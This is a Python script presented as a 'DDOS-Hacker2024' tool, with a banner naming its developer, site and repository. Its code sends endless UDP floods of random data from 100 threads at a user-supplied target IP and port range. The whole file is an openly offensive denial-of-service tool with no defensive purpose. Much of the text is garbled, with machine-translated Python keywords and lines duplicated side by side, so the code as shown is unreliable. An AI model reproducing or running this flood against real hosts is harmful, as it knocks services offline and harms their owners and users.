import导入系统  
import导入操作系统  
导入 导入时间  
进口进口货  
import导入线程  
from从日期时间导入日期时间  
  
# 打印程序标题

打印(  r"""

___ ____ ___ ____ __ __ __ ____ ___ ____ ___   
| _ \| _\/_\/___| | | | | __ _ ___| | _____ _ _|___ \ / _ \___ \| || |  
| | | | | | | | | \___ \ _____| |_| |/ _` |/ __| |/ / _ \ '__|__) | | | |__) | || |_
| |_| | |_| | |_| |___) |_____| _ | (_| | (__| < __/ | / __/| |_| / __/|__ _|
|____/|____/ \___/|____/ |_| |_|\__,_|\___|_|\_\___|_| |_____|\___/_____| |_|  
                                                                                     

官方网站：https://www.hackerit.cc

项目地址：https://github.com/GXlinyihua/DDOS-Hacker2024

开发人员：林易华 v 樱花泪

电子邮箱：ihonker08@163.com

————————————————————
“””）


  
#创建UDP帮助  
defdef create_socket(target_ip, target_port): create_socket(target_ip, target_port):  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 帮助（帮助。AF_INET ，帮助。SOCK_DGRAM ）  
    sock.settimeout ( 1 ) #设置超时时间，阻止SDK支持  
    返回sock、目标IP、目标端口  
  
# UDP洪水攻击函数  
def udp_flood （袜子，目标IP，目标端口）：  
    而真实：  
        尝试：  
            # 生成随机数据  
            random_data = os.乌兰多姆( 6666 )  
            sock.发送到（随机数据，（目标IP，目标端口））  
            print(f"已向{target_ip}:{target_port}发送数据包")  print ( f"已向{ target_ip } : { target_port }发送数据包" )  
        除了socket.error为e：  except socket.error as e:  
            print(f"辅助错误：{e}")  print(f"套接字错误：{e}")  
            休息  break  
        time.sleep(0.01) # 增加一些延迟  sleep(0.01)  # 添加一些延迟  
  
# 主函数  
defdef main():  main():  
    # 获取目标IP和端口  # 获取目标IP和端口  
    target_ip = input("目标IP：")  input("目标IP：")  
    target_port = int(input("端口号："))  int(input("端口号："))  
  
    # 创建应用程序和线程列表  # 创建套接字和线程列表  
    套接字 = []  []  
    线程 = []  []  
  
    # 创建多个架构和架构  # 创建多个套接字和线程  
    for i in range(100): # 假设我们创建 100 个线程  for i in range(100):  # 假设我们创建100个线程  
        袜子，目标IP，目标端口= create_socket（目标IP，目标端口+我）  create_socket(target_ip, target_port + i)  
        套接字.append(sock)  append(sock)  
        t = threading.Thread(target=udp_flood, args=(sock, target_ip, target_port))  Thread(target=udp_flood, args=(sock, target_ip, target_port))  
        线程.append(t)  append(t)  
        t.start()  start()  
  
    # 等待所有线程完成（实际上，可能不需要等待，因为攻击是持续的）  # 等待所有线程完成（实际中，可能不需要等待，因为攻击是持续的）  
    对于线程中的 t：  for t in threads:  
        t.join()  join()  
  
    # 关闭所有辅助功能  # 关闭所有套接字  
    对于插座中的袜子：  for sock in sockets:  
        袜子.close()  close()  
  
if如果 __name__ == "__main__":  "__main__":  
    主要的（）main()
